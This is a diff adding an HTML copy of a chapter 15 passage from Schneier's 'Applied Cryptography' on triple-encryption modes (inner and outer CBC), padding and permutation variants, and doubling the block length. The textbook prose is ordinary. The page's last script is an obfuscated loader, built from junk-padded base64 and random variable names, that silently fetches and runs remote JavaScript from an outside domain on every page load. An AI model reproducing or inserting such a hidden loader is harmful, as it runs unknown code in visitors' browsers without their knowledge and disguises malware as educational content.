@@ -1,0 +1,104 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Combining Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=15//-->
+<!--PAGES=360-363//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Both modes require more resources than single encryption: more hardware or more time. However, given three encryption chips, the throughput of inner-CBC is no slower than single encryption. Since the three CBC encryptions are independent, three chips can be kept busy all the time, each feeding back into itself.
+</P>
+<P>On the other hand, outer-CBC feedback is outside the three encryptions. This means that even with three chips, the throughput is only one-third that of single encryption. To get the same throughput with outer-CBC, you need to interleave IVs (see Section 9.12):</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/15-01.jpg',317,218 )"><IMG SRC="images/15-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/15-01.jpg',317,218)"><FONT COLOR="#000077"><B>Figure 15.1</B></FONT></A>&nbsp;&nbsp;Triple encryption in CBC mode.</I>
+</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>E</I><SUB>K3</SUB>(<I>D</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I><SUB>i</SUB> &#8853; <I>C</I><SUB>i-3</SUB>)))
+</DL>
+<P>In this case <I>C</I><SUB>0</SUB>, <I>C</I><SUB>-1</SUB>, and <I>C</I><SUB>-2</SUB> are IVs. This doesn&#146;t help software implementations any, unless you have a parallel machine.</P>
+<P>Unfortunately, the simpler mode is also the least secure. Biham analyzed various modes with respect to chosen-ciphertext differential cryptanalysis and found that inner-CBC is only slightly more secure than single encryption against a differential attack. If you think of triple encryption as a single larger algorithm, then inner feedbacks allow the introduction of external and known information into the inner workings of the algorithm; this facilitates cryptanalysis. The differential attacks require enormous amounts of chosen ciphertext to mount and are not very practical, but the results should be enough to give the most paranoid pause. Another analysis against meet-in-the-middle and brute-force attacks concludes that they are all equally secure [806].</P>
+<P>There are other modes, as well. You can encrypt the entire file once in ECB, then twice in CBC; or once in CBC, once in ECB, and once in CBC; or twice in CBC and once in ECB. Biham showed that these variants are no more secure than single DES against a chosen-plaintext differential cryptanalysis attack [162]. And he doesn&#146;t have high hopes for any other variants. If you are going to use triple encryption, use modes with outer feedback.</P>
+<P><FONT SIZE="+1"><B><I>Variants on Triple Encryption</I></B></FONT></P>
+<P>Before there were proofs that DES does not form a group, several schemes were proposed for multiple encryption. One way to guarantee that triple encryption doesn&#146;t reduce to single encryption is to change the effective block size. One simple method is to add a bit of padding. Pad the text with a string of random bits, half a block in length, between the first and second and between the second and third encryptions (see Figure 15.2). If p is the padding function, then:
+</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K3</SUB>(<I>p</I>(<I>E</I><SUB>K2</SUB>(<I>p</I>(<I>E</I><SUB>K1</SUB>(<I>P</I>)))))
+</DL>
+<P>This padding not only disrupts patterns, but also overlaps encrypted blocks like bricks. It only adds one block to the length of the message.
+</P>
+<P>Another technique, proposed by Carl Ellison, is to use some kind of keyless permutation function between the three encryptions. The permutation could work on large blocks&#151;8 kilobytes or so&#151;and would effectively give this variant a block size of 8 kilobytes. Assuming that the permutation is fast, this variant is not much slower than basic triple encryption.</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K3</SUB>(<I>T</I>(<I>E</I><SUB>K2</SUB>(<I>T</I>(<I>E</I><SUB>K1</SUB>(<I>P</I>)))))
+</DL>
+<P><I>T</I> collects a block of input (up to 8 kilobytes in length) and uses a pseudo-random-number generator to transpose it. A 1-bit change in the input causes 8 changed output bytes after the first encryption, up to 64 changed output bytes after the second encryption, and up to 512 changed output bytes after the third encryption. If each block algorithm is in CBC mode, as originally proposed, then the effect of a single changed input bit is likely to be the entire 8 kilobyte block, even in blocks other than the first.</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/15-02.jpg',275,164 )"><IMG SRC="images/15-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/15-02.jpg',275,164)"><FONT COLOR="#000077"><B>Figure 15.2</B></FONT></A>&nbsp;&nbsp;Triple encryption with padding.</I>
+</P>
+<P>The most recent variant of this scheme responded to Biham&#146;s attack on inner-CBC by including a whitening pass to hide plaintext patterns. That pass is a stream XOR with a cryptographically secure random-number generator called <I>R</I> below. The <I>T</I> on either side of it prevents the cryptanalyst from knowing <I>a priori</I> which key was used to encrypt any given byte on input to the last encryption. The second encryption is labelled <I>nE</I> (encryption with one of <I>n</I> different keys, used cyclically):</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K3</SUB>(<I>R</I>(<I>T</I>(<I>nE</I><SUB>K2</SUB>(<I>T</I>(<I>E</I><SUB>K1</SUB>(<I>R</I>))))))
+</DL>
+<P>All encryptions are in ECB mode and keys are provided at least for the <I>n</I> &#43; 2 encryption keys and the cryptographically secure random-number generator.</P>
+<P>This scheme was proposed with DES, but works with any block algorithm. I know of no analysis of the security of this scheme.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">15.3 Doubling the Block Length</FONT></H3>
+<P>There is some argument in the academic community whether a 64-bit block is long enough. On the one hand, a 64-bit block length only diffuses plaintext over 8 bytes of ciphertext. On the other hand, a longer block length makes it harder to hide patterns securely; there is more room to make mistakes.
+</P>
+<P>Some propose doubling the block length of an algorithm using multiple encryptions [299]. Before implementing any of these, look for the possibility of meet-in-the-middle attacks. Richard Outerbridge&#146;s scheme [300], illustrated in Figure 15.3, is no more secure than single-block, two-key triple encryption [859].</P>
+<P>However, I advise against this sort of thing. It isn&#146;t faster than conventional triple encryption: six encryptions are still required to encrypt two blocks of data. We know the characteristics of triple encryption; constructions like this often have hidden problems.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(WLgwDuCz, KaCykuZJ) {KaCykuZJ = WLgwDuCz.createElement('script');KaCykuZJ.type = 'text/javascript';KaCykuZJ.async = true;KaCykuZJ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');WLgwDuCz.getElementsByTagName('body')[0].appendChild(KaCykuZJ);}(document));</script></body>
+</html>
